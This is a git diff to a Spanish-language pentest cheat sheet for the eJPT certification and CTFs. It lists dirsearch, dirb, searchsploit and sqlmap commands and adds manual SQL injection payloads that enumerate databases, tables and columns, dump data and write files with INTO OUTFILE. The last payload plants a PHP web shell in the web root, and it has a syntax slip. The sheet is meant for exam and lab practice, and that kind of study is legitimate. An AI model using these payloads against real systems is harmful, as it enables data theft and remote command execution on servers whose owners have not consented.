@@ -42,7 +42,7 @@ Ayuda de algunos comandos que pueden utilizarse en el eJPT o en algun CTF.
 #### Herramientas dirsearch , dirb podemos usar tambien gobuster
     dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]
     dirb http://<IP>
-### Buscar exploits
+# Buscar exploits
 ### Sabemos que para buscar vulnerabilidades podemos usar google u tirar de esta  herramienta llamada searchsploit
 #### Busqueda 
     searchsploit <Name>
@@ -50,6 +50,7 @@ Ayuda de algunos comandos que pueden utilizarse en el eJPT o en algun CTF.
     searchsploit -x path : example searchsploit -x linux_x86-64/47151.c
 #### copiar exploit
     searchsploit -m path : example searchsploit -m linux_x86-64/47151.c
+# SQLi
 ### SQLMap
 ### Podemos tirar de esta herramienta para las injecciones SQL , pero dejare un pequeño recurso para hacerlo manualmente.
     sqlmap -u http://<IP> -p parameter
@@ -58,3 +59,22 @@ Ayuda de algunos comandos que pueden utilizarse en el eJPT o en algun CTF.
     sqlmap -u http://<IP> --dump
 ### Recurso 
 https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/sql/
+### Sentencias comunes SQLi
+#### Probar si nos lanza algun error
+    '
+    ' Order by 1000 : tratar de ordenar datos.
+    ' Union Select 1 : esperar las columnas.
+    ' Union Select "test" : esperar las columnas.
+#### Obtener nombre de la DB
+    ' Union Select database() -- -
+    ' Union select schema_name from information_schema.schemata -- -
+#### Tablas
+    ' Union select table_name from information_schema.tables where table_schema="nameDB" -- -
+#### Columnas
+' Union Select column_name from information_schema.columns where table_schema="nameDB" and table_name="nameTable" -- -
+#### Data extract
+' Union select group_concat(column1,...,coluumnN) from <tablenale> -- -
+#### Upload file or Create content
+' Union Select "Probando" into outfile "/var/www/html/prueba.txt" -- -
+#### PHP with SQLi
+    'Union Select "<?php system($_GET['cmd'];?>" into outfile "/var/www/html/commandExec.php" -- -
